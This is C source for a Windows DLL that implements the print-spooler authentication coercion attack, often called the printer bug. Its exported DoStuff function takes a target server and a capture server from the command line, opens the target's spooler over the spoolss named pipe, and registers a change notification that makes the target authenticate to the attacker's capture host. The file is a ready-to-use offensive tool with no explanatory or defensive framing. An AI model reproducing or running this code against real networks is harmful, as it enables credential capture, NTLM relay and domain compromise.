// MS-RPRN.cpp : Defines the entry point for the console application.
//
// Compiled interface definition(.idl file) with "midl.exe /target NT60 ms-rprn.idl"
#include "stdafx.h"
#include "ms-rprn_h.h"

#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <windows.h>
#include <winbase.h>
#include <winhttp.h>
#include <winternl.h>
#include <wincrypt.h>
#include <memory.h>
#include <memoryapi.h>
#include <sddl.h>

#include <assert.h>

#define DLLEXPORT __declspec(dllexport)

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")

const RPC_WSTR MS_RPRN_UUID = (RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB";
const RPC_WSTR InterfaceAddress = (RPC_WSTR)L"\\pipe\\spoolss";

void __RPC_FAR * __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR *) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR * p)
{
	free(p);
}

// Taken from https://github.com/Paolo-Maffei/OpenNT/blob/master/printscan/print/spooler/spoolss/win32/bind.c#L65
handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
{
	RPC_STATUS RpcStatus;
	RPC_WSTR StringBinding;
	handle_t BindingHandle;
	WCHAR   ServerName[MAX_PATH + 1];
	DWORD   i;

	if (lpStr && lpStr[0] == L'\\' && lpStr[1] == L'\\') {
		// We have a servername
		ServerName[0] = ServerName[1] = '\\';

		i = 2;
		while (lpStr[i] && lpStr[i] != L'\\' && i < sizeof(ServerName)) {
			ServerName[i] = lpStr[i];
			i++;
		}

		ServerName[i] = 0;
	}
	else {
		return FALSE;
	}

	RpcStatus = RpcStringBindingComposeW(
		MS_RPRN_UUID,
		(RPC_WSTR)L"ncacn_np",
		(RPC_WSTR)ServerName,
		InterfaceAddress,
		NULL,
		&StringBinding);

	if (RpcStatus != RPC_S_OK) {
		return(0);
	}

	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

	RpcStringFreeW(&StringBinding);

	if (RpcStatus != RPC_S_OK) {
		return(0);
	}

	return(BindingHandle);
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle)
{
	RPC_STATUS       RpcStatus;

	RpcStatus = RpcBindingFree(&BindingHandle);
	assert(RpcStatus != RPC_S_INVALID_BINDING);

	return;
}

struct ThreadParams {
	wchar_t* targetServer;
	wchar_t* captureServer;
};

// modified this function to run as a thread so that it can be timed out.
DWORD WINAPI Send(LPVOID lpParam)
{
	struct ThreadParams* params = (struct ThreadParams*)lpParam;

	wchar_t* targetServer = params->targetServer;
	wchar_t* captureServer = params->captureServer;

	PRINTER_HANDLE hPrinter = NULL;
	HRESULT hr = NULL;
	DEVMODE_CONTAINER devmodeContainer;
	SecureZeroMemory((char *)&(devmodeContainer), sizeof(DEVMODE_CONTAINER));

	RpcTryExcept
	{
		hr = RpcOpenPrinter(targetServer, &hPrinter, NULL, &devmodeContainer, 0);

		if (hr == ERROR_SUCCESS) {
			RpcRemoteFindFirstPrinterChangeNotificationEx(
				hPrinter,
				0x00000100 /* PRINTER_CHANGE_ADD_JOB */,
				0,
				captureServer,
				0,
				NULL);
				RpcClosePrinter(&hPrinter);
		}
		else
		{
			wprintf(L"RpcOpenPrinter failed %d\n", hr);
		}
	}
	RpcExcept(EXCEPTION_EXECUTE_HANDLER);
	{
		hr = RpcExceptionCode();
		wprintf(L"RPC Exception %d. ", hr);
	}
	RpcEndExcept;

	return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

DLLEXPORT HRESULT DoStuff(LPVOID lpUserdata, DWORD nUserdataLen)
{
	if (nUserdataLen) {
		int numArgs = 0;
		LPWSTR* args = NULL;
		HANDLE hThread = NULL;
		DWORD dwThreadId = 0;
		DWORD dwWait = 0;

		args = CommandLineToArgvW((LPCWSTR)lpUserdata, &numArgs);

		struct ThreadParams *params = malloc(sizeof(struct ThreadParams));

		if (params == NULL) {
			return 1;
		}

		params->targetServer = args[0];
		params->captureServer = args[1];

		wprintf(L"[+] TargetServer: %s, CaptureServer: %s\n", args[0], args[1]);
		hThread = CreateThread(NULL, 0, Send, params, 0, &dwThreadId);

		if (hThread != NULL) {
			dwWait = WaitForSingleObject(hThread, 5000);
			if (dwWait != WAIT_OBJECT_0) {
				wprintf(L"[+] Notification wait timeout (This is good!)");
			}
		}
		else
		{
				wprintf(L"[X] Poop!");
		}
		free(params);
	}

	return 0;
}
